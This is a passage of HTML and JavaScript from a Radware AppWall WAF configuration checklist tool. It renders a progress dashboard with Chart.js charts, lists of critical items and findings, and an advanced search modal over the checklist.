                <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-5">
                    <h4 class="font-semibold text-gray-800 mb-4">Top Configuration Issues</h4>
                    <div class="overflow-y-auto max-h-64" id="dash-top-issues">
                        <div class="text-center py-8 text-gray-500">
                            <i class="fas fa-shield-alt text-3xl mb-2"></i>
                            <p>No issues have been documented</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="border-t border-gray-200 px-6 py-4 bg-gray-50">
            <button class="px-4 py-2 bg-radware-primary hover:bg-radware-secondary text-white rounded-lg transition-colors" id="dash-print-report">
                <i class="fas fa-print mr-2"></i> Print Dashboard
            </button>
        </div>
    </div>
</div>
<style>
    @media print {
        body * {
            visibility: hidden;
        }
        
        #dashboard-modal, #dashboard-modal * {
            visibility: visible;
        }
        
        #dashboard-modal {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: auto;
            overflow: visible;
            background-color: white;
        }
        
        .modal-close, #dash-print-report {
            display: none !important;
        }
        
        /* Ensure all charts are visible */
        #priorityChart, #categoryChart {
            height: 300px !important;
        }
        
        /* Add page breaks appropriately */
        .grid {
            page-break-inside: avoid;
        }
        
        /* Add a header with project name */
        @page {
            margin: 0.5cm;
        }
        
        #dashboard-modal::before {
            content: "Radware AppWall Configuration Status Report";
            display: block;
            text-align: center;
            font-size: 18pt;
            font-weight: bold;
            margin-bottom: 20px;
        }
    }
</style>


<script>
// --- Dashboard Functionality ---
let dashboardCharts = {};

// --- Loading Indicator Functions ---
function showLoadingIndicator(message = 'Loading Dashboard...') {
    // Create loading overlay if it doesn't exist
    if (!document.getElementById('loading-overlay')) {
        const overlay = document.createElement('div');
        overlay.id = 'loading-overlay';
        overlay.className = 'fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center backdrop-blur-sm';
        
        overlay.innerHTML = `
            <div class="bg-white rounded-lg p-8 shadow-2xl">
                <div class="flex items-center">
                    <div class="w-16 h-16 border-4 border-t-radware-primary border-b-radware-primary border-r-transparent border-l-transparent rounded-full animate-spin mb-4 mr-4"></div>
                    <div>
                        <h3 class="text-xl font-bold text-gray-800 mb-2">${message}</h3>
                        <p class="text-gray-600">Please wait while we prepare your data...</p>
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(overlay);
    } else {
        const titleElement = document.querySelector('#loading-overlay h3');
        if (titleElement) {
            titleElement.textContent = message;
        }
        document.getElementById('loading-overlay').classList.remove('hidden');
    }
}

function hideLoadingIndicator() {
    const overlay = document.getElementById('loading-overlay');
    if (overlay) {
        overlay.classList.add('hidden');
    }
}

// Initialize Chart.js if it doesn't exist
function loadChartJs() {
    return new Promise((resolve, reject) => {
        try {
            if (window.Chart) {
                resolve();
                return;
            }
            
            console.log('Loading Chart.js library...');
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/chart.js@3.7.1/dist/chart.min.js';
            script.onload = () => {
                console.log('Chart.js loaded successfully');
                resolve();
            };
            script.onerror = (e) => {
                console.error('Failed to load Chart.js:', e);
                reject(new Error('Failed to load Chart.js library'));
            };
            document.head.appendChild(script);
        } catch (error) {
            console.error('Error in loadChartJs:', error);
            reject(error);
        }
    });
}

// Initialize dashboard event listeners
function initDashboard() {
    try {
        // Setup dashboard button click handler
        const dashboardBtn = document.getElementById('btn-dashboard');
        if (dashboardBtn) {
            dashboardBtn.addEventListener('click', function() {
                launchDashboard();
            });
        } else {
            console.warn('Dashboard button not found in the DOM');
        }
        
        // Setup print button handler
        const printBtn = document.getElementById('dash-print-report');
        if (printBtn) {
            printBtn.addEventListener('click', function() {
                window.print();
            });
        }
        
        console.log('Dashboard initialized successfully');
    } catch (error) {
        console.error('Error initializing dashboard:', error);
        showToast('There was an error initializing the dashboard functionality', 'error');
    }
}

// Launch dashboard with loading and error handling
function launchDashboard() {
    console.log('Launching dashboard...');
    
    try {
        if (!currentProject) {
            showToast('No project data available', 'warning');
            return;
        }
        
        showLoadingIndicator('Loading Dashboard...');
        
        loadChartJs()
            .then(() => {
                console.log('Rendering dashboard...');
                renderDashboard();
                toggleModal('dashboard-modal', true);
                hideLoadingIndicator();
            })
            .catch(error => {
                console.error('Dashboard error:', error);
                hideLoadingIndicator();
                showToast('Failed to load dashboard components. ' + error.message, 'error');
            });
    } catch (error) {
        console.error('Error launching dashboard:', error);
        hideLoadingIndicator();
        showToast('There was an error loading the dashboard', 'error');
    }
}

// Main dashboard rendering function
function renderDashboard() {
    try {
        if (!currentProject) {
            console.warn('No project data available for dashboard rendering');
            return;
        }
        
        // Calculate all dashboard metrics
        console.log('Calculating dashboard metrics...');
        const metrics = calculateDashboardMetrics();
        
        // Update dashboard components
        console.log('Updating overview cards...');
        updateOverviewCards(metrics);
        
        console.log('Rendering category chart...');
        renderCategoryChart(metrics.categoryData);
        
        console.log('Rendering priority chart...');
        renderPriorityChart(metrics.priorityData);
        
        console.log('Rendering critical items list...');
        renderCriticalItems(metrics.incompleteItems.filter(item => item.priority === 'critical'));
        
        console.log('Rendering top issues...');
        renderTopIssues();
        
        console.log('Dashboard rendered successfully');
    } catch (error) {
        console.error('Error rendering dashboard:', error);
        showToast('There was an error rendering the dashboard data', 'error');
    }
}

// Calculate all metrics needed for the dashboard
function calculateDashboardMetrics() {
    const metrics = {
        overallCompletion: 0,
        criticalCompletion: 0,
        criticalTotal: 0,
        criticalCompleted: 0,
        highTotal: 0,
        highCompleted: 0,
        mediumTotal: 0,
        mediumCompleted: 0,
        lowTotal: 0,
        lowCompleted: 0,
        categoryData: [],
        priorityData: {
            labels: ['Critical', 'High', 'Medium', 'Low'],
            completed: [0, 0, 0, 0],
            incomplete: [0, 0, 0, 0]
        },
        incompleteItems: [],
        totalTasks: 0,
        completedTasks: 0
    };
    
    try {
        // Calculate task statistics
        appwallData.categories.forEach(category => {
            const categoryStats = {
                name: category.title,
                id: category.id,
                total: 0,
                completed: 0,
                critical: 0,
                criticalCompleted: 0,
                high: 0,
                highCompleted: 0,
                medium: 0,
                mediumCompleted: 0,
                low: 0,
                lowCompleted: 0
            };
            
            category.checklist.forEach(group => {
                group.items.forEach(item => {
                    metrics.totalTasks++;
                    categoryStats.total++;
                    
                    // Count by priority
                    if (item.priority === 'critical') {
                        metrics.criticalTotal++;
                        categoryStats.critical++;
                    } else if (item.priority === 'high') {
                        metrics.highTotal++;
                        categoryStats.high++;
                    } else if (item.priority === 'medium') {
                        metrics.mediumTotal++;
                        categoryStats.medium++;
                    } else if (item.priority === 'low') {
                        metrics.lowTotal++;
                        categoryStats.low++;
                    }
                    
                    // Check completion status
                    const status = currentProject.taskStatus && currentProject.taskStatus[item.id];
                    if (status === TASK_STATUS.PASSED) {
                        metrics.completedTasks++;
                        categoryStats.completed++;
                        
                        if (item.priority === 'critical') {
                            metrics.criticalCompleted++;
                            categoryStats.criticalCompleted++;
                        } else if (item.priority === 'high') {
                            metrics.highCompleted++;
                            categoryStats.highCompleted++;
                        } else if (item.priority === 'medium') {
                            metrics.mediumCompleted++;
                            categoryStats.mediumCompleted++;
                        } else if (item.priority === 'low') {
                            metrics.lowCompleted++;
                            categoryStats.lowCompleted++;
                        }
                    } else if (status !== TASK_STATUS.NA) {
                        // Add to incomplete items list if not marked NA
                        metrics.incompleteItems.push({
                            id: item.id,
                            text: item.text,
                            priority: item.priority,
                            categoryId: category.id,
                            categoryTitle: category.title,
                            groupTitle: group.title
                        });
                    }
                });
            });
            
            // Calculate category completion percentage
            categoryStats.percentage = categoryStats.total > 0 
                ? Math.round((categoryStats.completed / categoryStats.total) * 100) 
                : 0;
                
            metrics.categoryData.push(categoryStats);
        });
        
        // Sort incomplete items by priority (critical first)
        metrics.incompleteItems.sort((a, b) => {
            const priorityOrder = { 'critical': 0, 'high': 1, 'medium': 2, 'low': 3 };
            return priorityOrder[a.priority] - priorityOrder[b.priority];
        });
        
        // Calculate overall completion percentage
        metrics.overallCompletion = metrics.totalTasks > 0 
            ? Math.round((metrics.completedTasks / metrics.totalTasks) * 100) 
            : 0;
            
        // Calculate critical items completion percentage
        metrics.criticalCompletion = metrics.criticalTotal > 0 
            ? Math.round((metrics.criticalCompleted / metrics.criticalTotal) * 100) 
            : 0;
            
        // Update priority data for the chart
        metrics.priorityData.completed = [
            metrics.criticalCompleted,
            metrics.highCompleted,
            metrics.mediumCompleted,
            metrics.lowCompleted
        ];
        
        metrics.priorityData.incomplete = [
            metrics.criticalTotal - metrics.criticalCompleted,
            metrics.highTotal - metrics.highCompleted,
            metrics.mediumTotal - metrics.mediumCompleted,
            metrics.lowTotal - metrics.lowCompleted
        ];
        
    } catch (error) {
        console.error('Error calculating dashboard metrics:', error);
    }
    
    return metrics;
}

// Update overview cards with calculated metrics
function updateOverviewCards(metrics) {
    try {
        // Overall completion
        const overallCompletionEl = document.getElementById('dash-overall-completion');
        if (overallCompletionEl) overallCompletionEl.textContent = `${metrics.overallCompletion}%`;
        
        const overallBarEl = document.getElementById('dash-overall-bar');
        if (overallBarEl) overallBarEl.style.width = `${metrics.overallCompletion}%`;
        
        // Critical items completion
        const criticalCompletionEl = document.getElementById('dash-critical-completion');
        if (criticalCompletionEl) criticalCompletionEl.textContent = `${metrics.criticalCompletion}%`;
        
        const criticalCountEl = document.getElementById('dash-critical-count');
        if (criticalCountEl) criticalCountEl.textContent = `${metrics.criticalCompleted}/${metrics.criticalTotal} items`;
        
        const criticalBarEl = document.getElementById('dash-critical-bar');
        if (criticalBarEl) criticalBarEl.style.width = `${metrics.criticalCompletion}%`;
        
        // Configuration issues
        const issuesCount = appwallData.findings ? appwallData.findings.length : 0;
        const issuesCountEl = document.getElementById('dash-issues-count');
        if (issuesCountEl) issuesCountEl.textContent = issuesCount;
        
        // Count issues by severity
        const highIssues = appwallData.findings ? appwallData.findings.filter(f => f.severity === 'high').length : 0;
        const mediumIssues = appwallData.findings ? appwallData.findings.filter(f => f.severity === 'medium').length : 0;
        const lowIssues = appwallData.findings ? appwallData.findings.filter(f => f.severity === 'low').length : 0;
        
        const highCountEl = document.getElementById('dash-high-count');
        if (highCountEl) highCountEl.textContent = highIssues;
        
        const mediumCountEl = document.getElementById('dash-medium-count');
        if (mediumCountEl) mediumCountEl.textContent = mediumIssues;
        
        const lowCountEl = document.getElementById('dash-low-count');
        if (lowCountEl) lowCountEl.textContent = lowIssues;
        
        // Calculate percentages for the bars
        const highPercent = issuesCount > 0 ? (highIssues / issuesCount) * 100 : 0;
        const mediumPercent = issuesCount > 0 ? (mediumIssues / issuesCount) * 100 : 0;
        const lowPercent = issuesCount > 0 ? (lowIssues / issuesCount) * 100 : 0;
        
        const highBarEl = document.getElementById('dash-high-bar');
        if (highBarEl) highBarEl.style.width = `${highPercent}%`;
        
        const mediumBarEl = document.getElementById('dash-medium-bar');
        if (mediumBarEl) mediumBarEl.style.width = `${mediumPercent}%`;
        
        const lowBarEl = document.getElementById('dash-low-bar');
        if (lowBarEl) lowBarEl.style.width = `${lowPercent}%`;
        
        // Last updated
        if (currentProject.lastUpdated) {
            const lastUpdated = new Date(currentProject.lastUpdated);
            
            const lastUpdatedEl = document.getElementById('dash-last-updated');
            if (lastUpdatedEl) lastUpdatedEl.textContent = formatDate(lastUpdated);
            
            // Calculate days ago
            const now = new Date();
            const diffTime = Math.abs(now - lastUpdated);
            const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
            
            const daysAgoEl = document.getElementById('dash-days-ago');
            if (daysAgoEl) {
                if (diffDays === 0) {
                    daysAgoEl.textContent = 'Today';
                } else if (diffDays === 1) {
                    daysAgoEl.textContent = 'Yesterday';
                } else {
                    daysAgoEl.textContent = `${diffDays} days ago`;
                }
            }
            
            // Update trend indicator based on recent activity
            const trendElement = document.getElementById('dash-overall-trend');
            if (trendElement) {
                if (diffDays < 7) {
                    // Active project (updated within last week)
                    const progressRate = metrics.overallCompletion >= 10 ? 'â Active' : 'â¡ Slow';
                    trendElement.className = metrics.overallCompletion >= 10 ? 'text-green-500 flex items-center text-sm' : 'text-yellow-500 flex items-center text-sm';
                    trendElement.innerHTML = `<i class="fas fa-${metrics.overallCompletion >= 10 ? 'arrow-up' : 'arrow-right'} mr-1"></i> ${progressRate}`;
                } else {
                    // Inactive project
                    trendElement.className = 'text-gray-500 flex items-center text-sm';
                    trendElement.innerHTML = `<i class="fas fa-pause mr-1"></i> Inactive`;
                }
            }
            
            // Last updated item
            const lastUpdatedItemEl = document.getElementById('dash-last-updated-item');
            if (lastUpdatedItemEl) lastUpdatedItemEl.textContent = 'Configuration status updated';
        }
    } catch (error) {
        console.error('Error updating overview cards:', error);
    }
}

// Render category completion chart
function renderCategoryChart(categoryData) {
    try {
        const chartCanvas = document.getElementById('categoryChart');
        if (!chartCanvas) {
            console.warn('Category chart canvas not found');
            return;
        }
        
        const ctx = chartCanvas.getContext('2d');
        if (!ctx) {
            console.warn('Unable to get 2D context for category chart');
            return;
        }
        
        // Destroy existing chart if it exists
        if (dashboardCharts.categoryChart) {
            dashboardCharts.categoryChart.destroy();
        }
        
        // Prepare data for the chart
        const labels = categoryData.map(cat => cat.name);
        const completionData = categoryData.map(cat => cat.percentage);
        const backgroundColors = categoryData.map(cat => {
            if (cat.percentage < 30) return 'rgba(239, 68, 68, 0.7)'; // Red
            if (cat.percentage < 70) return 'rgba(245, 158, 11, 0.7)'; // Yellow
            return 'rgba(16, 185, 129, 0.7)'; // Green
        });
        
        // Create a horizontal bar chart
        dashboardCharts.categoryChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: labels,
                datasets: [{
                    label: 'Completion (%)',
                    data: completionData,
                    backgroundColor: backgroundColors,
                    borderColor: backgroundColors.map(color => color.replace('0.7', '1')),
                    borderWidth: 1
                }]
            },
            options: {
                indexAxis: 'y',
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    },
                    tooltip: {
                        callbacks: {
                            label: function(context) {
                                const catData = categoryData[context.dataIndex];
                                return [
                                    `Completion: ${catData.percentage}%`,
                                    `Completed: ${catData.completed}/${catData.total}`,
                                    `Critical: ${catData.criticalCompleted}/${catData.critical}`
                                ];
                            }
                        }
                    }
                },
                scales: {
                    x: {
                        beginAtZero: true,
                        max: 100,
                        title: {
                            display: true,
                            text: 'Completion (%)'
                        }
                    }
                }
            }
        });
    } catch (error) {
        console.error('Error rendering category chart:', error);
    }
}

// Render priority chart
function renderPriorityChart(priorityData) {
    try {
        const chartCanvas = document.getElementById('priorityChart');
        if (!chartCanvas) {
            console.warn('Priority chart canvas not found');
            return;
        }
        
        const ctx = chartCanvas.getContext('2d');
        if (!ctx) {
            console.warn('Unable to get 2D context for priority chart');
            return;
        }
        
        // Destroy existing chart if it exists
        if (dashboardCharts.priorityChart) {
            dashboardCharts.priorityChart.destroy();
        }
        
        // Create a stacked bar chart
        dashboardCharts.priorityChart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: priorityData.labels,
                datasets: [
                    {
                        label: 'Completed',
                        data: priorityData.completed,
                        backgroundColor: 'rgba(16, 185, 129, 0.7)', // Green
                        borderColor: 'rgba(16, 185, 129, 1)',
                        borderWidth: 1
                    },
                    {
                        label: 'Incomplete',
                        data: priorityData.incomplete,
                        backgroundColor: 'rgba(239, 68, 68, 0.7)', // Red
                        borderColor: 'rgba(239, 68, 68, 1)',
                        borderWidth: 1
                    }
                ]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                scales: {
                    x: {
                        stacked: true
                    },
                    y: {
                        stacked: true,
                        beginAtZero: true
                    }
                },
                plugins: {
                    tooltip: {
                        callbacks: {
                            label: function(context) {
                                const datasetLabel = context.dataset.label;
                                const value = context.raw;
                                const total = priorityData.completed[context.dataIndex] + 
                                            priorityData.incomplete[context.dataIndex];
                                const percentage = Math.round((value / total) * 100) || 0;
                                return `${datasetLabel}: ${value} (${percentage}%)`;
                            }
                        }
                    }
                }
            }
        });
    } catch (error) {
        console.error('Error rendering priority chart:', error);
    }
}

// Render critical items that need attention
function renderCriticalItems(criticalItems) {
    try {
        const container = document.getElementById('dash-critical-items');
        if (!container) {
            console.warn('Critical items container not found');
            return;
        }
        
        if (!criticalItems || criticalItems.length === 0) {
            container.innerHTML = `
                <div class="text-center py-8 text-gray-500">
                    <i class="fas fa-check-circle text-3xl mb-2 text-green-500"></i>
                    <p>All critical items have been addressed!</p>
                </div>
            `;
            return;
        }
        
        // Limit to top 10 items
        const itemsToShow = criticalItems.slice(0, 10);
        
        let html = `<div class="divide-y divide-gray-200">`;
        
        itemsToShow.forEach(item => {
            html += `
                <div class="py-3 hover:bg-gray-50 cursor-pointer task-link" data-category="${item.categoryId}" data-task-id="${item.id}">
                    <div class="flex items-start">
                        <div class="bg-status-critical w-6 h-6 rounded-full flex items-center justify-center text-white flex-shrink-0 mt-1">
                            <i class="fas fa-exclamation-triangle text-xs"></i>
                        </div>
                        <div class="ml-3">
                            <p class="text-sm font-medium text-gray-900">${item.text}</p>
                            <p class="text-xs text-gray-500">${item.categoryTitle} â¢ ${item.groupTitle}</p>
                        </div>
                    </div>
                </div>
            `;
        });
        
        html += `</div>`;
        container.innerHTML = html;
        
        // Add event listeners for task navigation
        container.querySelectorAll('.task-link').forEach(item => {
            item.addEventListener('click', function() {
                const categoryId = this.getAttribute('data-category');
                const taskId = this.getAttribute('data-task-id');
                toggleModal('dashboard-modal', false);
                navigateToTaskItem(categoryId, taskId);
            });
        });
    } catch (error) {
        console.error('Error rendering critical items:', error);
    }
}

// Render top configuration issues
function renderTopIssues() {
    try {
        const container = document.getElementById('dash-top-issues');
        if (!container) {
            console.warn('Top issues container not found');
            return;
        }
        
        if (!appwallData.findings || appwallData.findings.length === 0) {
            container.innerHTML = `
                <div class="text-center py-8 text-gray-500">
                    <i class="fas fa-shield-alt text-3xl mb-2"></i>
                    <p>No issues have been documented</p>
                </div>
            `;
            return;
        }
        
        // Sort findings by severity (high to low)
        const sortedFindings = [...appwallData.findings].sort((a, b) => {
            const severityOrder = { 'high': 0, 'medium': 1, 'low': 2, 'info': 3 };
            return severityOrder[a.severity] - severityOrder[b.severity];
        });
        
        // Limit to top 5 issues
        const issuesToShow = sortedFindings.slice(0, 5);
        
        let html = `<div class="divide-y divide-gray-200">`;
        
        issuesToShow.forEach(issue => {
            const severityClass = getSeverityIconClass(issue.severity);
            
            html += `
                <div class="py-3 hover:bg-gray-50 cursor-pointer issue-link" data-issue-id="${issue.id}">
                    <div class="flex items-start">
                        <div class="${severityClass.bg} w-6 h-6 rounded-full flex items-center justify-center text-white flex-shrink-0 mt-1">
                            <i class="${severityClass.icon} text-xs"></i>
                        </div>
                        <div class="ml-3">
                            <p class="text-sm font-medium text-gray-900">${issue.title}</p>
                            <p class="text-xs text-gray-500">${getCategoryTitle(issue.category)} â¢ ${capitalizeFirstLetter(issue.severity)} Severity</p>
                        </div>
                    </div>
                </div>
            `;
        });
        
        html += `</div>`;
        container.innerHTML = html;
        
        // Add event listeners for issue viewing
        container.querySelectorAll('.issue-link').forEach(item => {
            item.addEventListener('click', function() {
                const issueId = this.getAttribute('data-issue-id');
                toggleModal('dashboard-modal', false);
                
                // Find the issue
                currentEditingFindingId = issueId;
                const finding = appwallData.findings.find(f => f.id === issueId);
                if (finding) {
                    openViewFindingModal(finding.category);
                }
            });
        });
    } catch (error) {
        console.error('Error rendering top issues:', error);
    }
}

// Helper function to get severity icon classes
function getSeverityIconClass(severity) {
    switch (severity) {
        case 'high':
            return { bg: 'bg-status-critical', icon: 'fas fa-exclamation-circle' };
        case 'medium':
            return { bg: 'bg-status-high', icon: 'fas fa-exclamation' };
        case 'low':
            return { bg: 'bg-status-medium', icon: 'fas fa-info-circle' };
        default:
            return { bg: 'bg-blue-500', icon: 'fas fa-info' };
    }
}

// Initialize dashboard when DOM is loaded
document.addEventListener('DOMContentLoaded', initDashboard);

</script>






















































<!-- Floating Search Button -->
<button id="advanced-search-btn" class="fixed top-24 right-6 z-40 bg-radware-primary hover:bg-radware-secondary text-white rounded-full w-14 h-14 flex items-center justify-center shadow-lg transition-all transform hover:scale-110">
    <i class="fas fa-search text-xl"></i>
</button>

<!-- Advanced Search Modal -->
<div id="search-modal" class="fixed inset-0 bg-gray-900/80 z-50 flex items-center justify-center hidden backdrop-blur-sm">
    <div class="bg-white rounded-xl shadow-2xl max-w-4xl w-full max-h-[90vh] overflow-hidden flex flex-col">
        <div class="border-b border-gray-200 px-6 py-4 flex justify-between items-center">
            <h3 class="text-xl font-semibold text-gray-900">Advanced WAF Configuration Search</h3>
            <button class="modal-close text-gray-500 hover:text-gray-700">
                <i class="fas fa-times"></i>
            </button>
        </div>
        
        <div class="flex-1 flex flex-col overflow-hidden">
            <!-- Search Controls -->
            <div class="p-6 bg-gray-50 border-b border-gray-200">
                <div class="flex flex-col sm:flex-row gap-4">
                    <div class="flex-1">
                        <div class="relative">
                            <input id="search-query-input" type="text" placeholder="Search for configuration items..." class="w-full px-4 py-3 rounded-lg border border-gray-300 shadow-sm pl-10 focus:outline-none focus:ring-2 focus:ring-radware-accent focus:border-transparent">
                            <div class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400">
                                <i class="fas fa-search"></i>
                            </div>
                            <button id="search-clear-btn" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 hidden">
                                <i class="fas fa-times-circle"></i>
                            </button>
                        </div>
                    </div>
                    <button id="search-btn" class="px-6 py-3 bg-radware-primary hover:bg-radware-secondary text-white rounded-lg flex items-center gap-2 shadow-md hover:shadow-lg transition whitespace-nowrap">
                        <i class="fas fa-search"></i>
                        <span>Search</span>
                    </button>
                </div>
                
                <div class="mt-4 grid grid-cols-1 md:grid-cols-3 gap-4">
                    <!-- Category Filter -->
                    <div>
                        <label for="search-category" class="block text-sm font-medium text-gray-700 mb-1">Category</label>
                        <select id="search-category" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="all">All Categories</option>
                            <!-- Categories will be dynamically added -->
                        </select>
                    </div>
                    
                    <!-- Priority Filter -->
                    <div>
                        <label for="search-priority" class="block text-sm font-medium text-gray-700 mb-1">Priority</label>
                        <select id="search-priority" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="all">All Priorities</option>
                            <option value="critical">Critical</option>
                            <option value="high">High</option>
                            <option value="medium">Medium</option>
                            <option value="low">Low</option>
                        </select>
                    </div>
                    
                    <!-- Status Filter -->
                    <div>
                        <label for="search-status" class="block text-sm font-medium text-gray-700 mb-1">Status</label>
                        <select id="search-status" class="w-full rounded-lg border-gray-300 shadow-sm focus:border-radware-accent focus:ring focus:ring-radware-accent/20 transition">
                            <option value="all">All Statuses</option>
                            <option value="passed">Completed</option>
                            <option value="not-tested">Not Started</option>
                            <option value="na">Not Applicable</option>
                        </select>
                    </div>
                </div>
                
                <div class="mt-3 text-xs text-gray-500 flex items-center">
                    <i class="fas fa-info-circle mr-1"></i>
                    <span>Search across all WAF configuration checklist items. Click on any result to navigate directly to that item.</span>
                </div>
            </div>
            
            <!-- Search Results -->
            <div class="flex-1 overflow-y-auto p-6">
                <div id="search-results-container" class="space-y-6">
                    <!-- Results will be dynamically inserted here -->
                    <div class="flex flex-col items-center justify-center text-center py-12 text-gray-500">
                        <div class="text-5xl mb-4">
                            <i class="fas fa-search"></i>
                        </div>
                        <h4 class="text-xl font-medium text-gray-700 mb-2">Search for WAF configuration items</h4>
                        <p class="max-w-md text-gray-500">Enter your search terms above to find specific checklist items across all categories.</p>
                    </div>
                </div>
                
                <div id="search-no-results" class="hidden flex flex-col items-center justify-center text-center py-12 text-gray-500">
                    <div class="text-5xl mb-4 text-gray-300">
                        <i class="fas fa-search-minus"></i>
                    </div>
                    <h4 class="text-xl font-medium text-gray-700 mb-2">No results found</h4>
                    <p class="max-w-md text-gray-500">Try adjusting your search terms or filters to find what you're looking for.</p>
                </div>
                
                <div id="search-loading" class="hidden flex flex-col items-center justify-center text-center py-12 text-gray-500">
                    <div class="w-16 h-16 border-4 border-t-radware-primary border-b-radware-primary border-r-transparent border-l-transparent rounded-full animate-spin mb-4"></div>
                    <h4 class="text-xl font-medium text-gray-700 mb-2">Searching...</h4>
                    <p class="max-w-md text-gray-500">Looking for matching configuration items.</p>
                </div>
            </div>
            
            <!-- Search Stats -->
            <div id="search-stats" class="hidden px-6 py-3 bg-gray-50 border-t border-gray-200 text-sm text-gray-600">
                Found <span id="search-count">0</span> results for "<span id="search-term"></span>"
            </div>
        </div>
    </div>
</div>

<!-- Item Highlight Animation -->
<style>
    @keyframes highlightPulse {
        0% { background-color: rgba(0, 80, 179, 0.2); }
        50% { background-color: rgba(0, 80, 179, 0.3); }
        100% { background-color: rgba(0, 80, 179, 0); }
    }
    
    .highlight-item {
        animation: highlightPulse 2s ease-in-out;
    }
    
    .search-result-item {
        transition: all 0.2s;
    }
    
    .search-result-item:hover {
        transform: translateX(5px);
    }
</style>

<script>






// --- Search Functionality ---
document.addEventListener('DOMContentLoaded', function() {
    // Add floating search button and setup event listeners
    setupAdvancedSearch();
});

function setupAdvancedSearch() {
    // Attach event listeners
    document.getElementById('advanced-search-btn').addEventListener('click', function() {
        toggleModal('search-modal', true);
        document.getElementById('search-query-input').focus();
        populateSearchCategoryOptions();
    });
    
    document.getElementById('search-btn').addEventListener('click', performSearch);
    
    document.getElementById('search-query-input').addEventListener('keyup', function(e) {
        // Show/hide clear button based on content
        document.getElementById('search-clear-btn').classList.toggle('hidden', !this.value);
        
        // Submit on Enter key
        if (e.key === 'Enter') {
            performSearch();
        }
    });
    
    document.getElementById('search-clear-btn').addEventListener('click', function() {
        document.getElementById('search-query-input').value = '';
        this.classList.add('hidden');
        document.getElementById('search-query-input').focus();
    });
    
    // Results delegation click handler
    document.getElementById('search-results-container').addEventListener('click', function(e) {
        const resultItem = e.target.closest('.search-result-item');
        if (resultItem) {
            const categoryId = resultItem.getAttribute('data-category');
            const taskId = resultItem.getAttribute('data-task-id');
            navigateToTaskItem(categoryId, taskId);
            toggleModal('search-modal', false);
        }
    });
}

function populateSearchCategoryOptions() {
    const categorySelect = document.getElementById('search-category');
    if (!categorySelect || categorySelect.children.length > 1) return;
    
    appwallData.categories.forEach(category => {
        const option = document.createElement('option');
        option.value = category.id;
        option.textContent = category.title;
        categorySelect.appendChild(option);
    });
}

function performSearch() {
    // Get search parameters
    const query = document.getElementById('search-query-input').value.toLowerCase().trim();
    const categoryFilter = document.getElementById('search-category').value;
    const priorityFilter = document.getElementById('search-priority').value;
    const statusFilter = document.getElementById('search-status').value;
    
    if (!query && categoryFilter === 'all' && priorityFilter === 'all' && statusFilter === 'all') {
        showToast('Please enter a search term or select a filter', 'warning');
        return;
    }
    
    // Show loading state
    document.getElementById('search-loading').classList.remove('hidden');
    document.getElementById('search-results-container').classList.add('hidden');
    document.getElementById('search-no-results').classList.add('hidden');
    document.getElementById('search-stats').classList.add('hidden');
    
    // Use setTimeout to allow UI to update before search begins
    setTimeout(() => {
        const results = searchChecklistItems(query, categoryFilter, priorityFilter, statusFilter);
        displaySearchResults(results, query);
        
        // Hide loading state
        document.getElementById('search-loading').classList.add('hidden');
    }, 300);
}

function searchChecklistItems(query, categoryFilter, priorityFilter, statusFilter) {
    const results = [];
    
    // Search through all categories and items
    appwallData.categories.forEach(category => {
        // Skip if category doesn't match filter
        if (categoryFilter !== 'all' && category.id !== categoryFilter) return;
        
        category.checklist.forEach(group => {
            group.items.forEach(item => {
                // Check if item meets all filter criteria
                if (priorityFilter !== 'all' && item.priority !== priorityFilter) return;
                
                // Status filter check
                const itemStatus = currentProject && currentProject.taskStatus ? 
                    currentProject.taskStatus[item.id] || 'not-tested' : 'not-tested';
                if (statusFilter !== 'all' && itemStatus !== statusFilter) return;
                
                // Text search (if query is provided)
                if (query && !item.text.toLowerCase().includes(query) && !item.id.toLowerCase().includes(query)) return;
                
                // If we get here, the item matches all criteria
                results.push({
                    id: item.id,
                    text: item.text,
                    priority: item.priority,
                    status: itemStatus,
                    categoryId: category.id,
                    categoryTitle: category.title,
                    groupTitle: group.title
                });
            });
        });
    });
    
    return results;
}

function displaySearchResults(results, query) {
    const container = document.getElementById('search-results-container');
    const noResults = document.getElementById('search-no-results');
    const statsContainer = document.getElementById('search-stats');
    
    // Update search stats
    document.getElementById('search-count').textContent = results.length;
    document.getElementById('search-term').textContent = query || 'all items';
    
    if (results.length === 0) {
        container.classList.add('hidden');
        noResults.classList.remove('hidden');
        statsContainer.classList.add('hidden');
        return;
    }
    
    // Group results by category
    const resultsByCategory = {};
    results.forEach(result => {
        if (!resultsByCategory[result.categoryId]) {
            resultsByCategory[result.categoryId] = {
                id: result.categoryId,
                title: result.categoryTitle,
                items: []
            };
        }
        resultsByCategory[result.categoryId].items.push(result);
    });
    
    // Build results HTML
    container.innerHTML = '';
    
    Object.values(resultsByCategory).forEach(category => {
        let categoryHTML = `
            <div class="search-category">
                <h3 class="text-lg font-semibold mb-3 flex items-center text-radware-primary">
                    <i class="fas fa-folder mr-2"></i>
                    ${category.title}
                    <span class="ml-2 text-sm font-normal text-gray-500">(${category.items.length} items)</span>
                </h3>
                <div class="bg-white rounded-lg shadow-md border border-gray-200 overflow-hidden">
        `;
        
        category.items.forEach((item, index) => {
            const isLast = index === category.items.length - 1;
            const priorityClass = getPriorityIndicatorClass(item.priority);
            const statusText = getStatusDisplayText(item.status);
            const statusClass = getStatusDisplayClass(item.status);
            
            categoryHTML += `
                <div class="search-result-item hover:bg-gray-50 cursor-pointer ${isLast ? '' : 'border-b border-gray-200'} p-4" 
                     data-category="${item.categoryId}" data-task-id="${item.id}">
                    <div class="flex items-start">
                        <span class="inline-block text-xs font-mono text-gray-500 mr-3 mt-1">${item.id}</span>
